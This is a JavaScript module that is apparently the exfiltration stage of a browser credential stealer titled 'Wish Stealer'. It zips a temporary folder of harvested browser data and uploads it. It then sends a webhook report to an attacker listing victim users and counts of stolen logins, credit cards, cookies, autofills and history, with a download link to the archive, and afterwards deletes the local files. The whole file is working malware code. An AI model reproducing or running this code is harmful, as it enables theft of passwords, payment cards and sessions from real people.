const fs = require('fs');
const path = require('path');
const os = require('os');

const structures = require('../browsers/structures.js');

const requests = require('./../../utils/requests/requests.js');
const fileutil = require('./../../utils/fileutil/fileutil.js');
const hardware = require('./../../utils/hardware/hardware.js');

const BrowserStats = structures.BrowserStatistics;

module.exports = async (webhookUrl) => {
    const wishTempDir = path.join(os.tmpdir(), 'wish');
    const wishTempZip = path.join(os.tmpdir(), 'wish.zip');

    try {
        await fileutil.zipDirectory({
            inputDir: wishTempDir,
            outputZip: wishTempZip
        });

        const link = await requests.upload(wishTempZip)

        await requests.webhook(webhookUrl, {
            embeds: [{
                title: 'Wish Stealer',
                description: '```' + BrowserStats.users.join(',\n') + '```',
                fields: [
                    {
                        name: 'Downloads',
                        value: '```' + (BrowserStats.downloadsCount ?? 0) + '```',
                        inline: true,
                    },
                    {
                        name: 'Historys',
                        value: '```' + (BrowserStats.historysCount ?? 0) + '```',
                        inline: true,
                    },
                    {
                        name: 'Book Marks',
                        value: '```' + (BrowserStats.bookmarksCount ?? 0) + '```',
                        inline: true,
                    },
                    {
                        name: 'Auto Fills',
                        value: '```' + (BrowserStats.autofillsCount ?? 0) + '```',
                        inline: true,
                    },
                    {
                        name: 'Logins',
                        value: '```' + (BrowserStats.loginsCount ?? 0) + '```',
                        inline: true,
                    },
                    {
                        name: 'Credit Cards',
                        value: '```' + (BrowserStats.credirCardsCount ?? 0) + '```',
                        inline: true,
                    },
                    {
                        name: 'Cookies',
                        value: '```' + (BrowserStats.cookiesCount ?? 0) + '```',
                        inline: true,
                    },
                    {
                        name: 'Archive Link',
                        value: '[Download here](' + link + ')',
                        inline: false,
                    },
                ]
            }],
        });

        [wishTempDir, wishTempZip].forEach(async dir => {
            await fileutil.removeDir(dir);
        });
    } catch (error) {
        console.error(error);
    }
};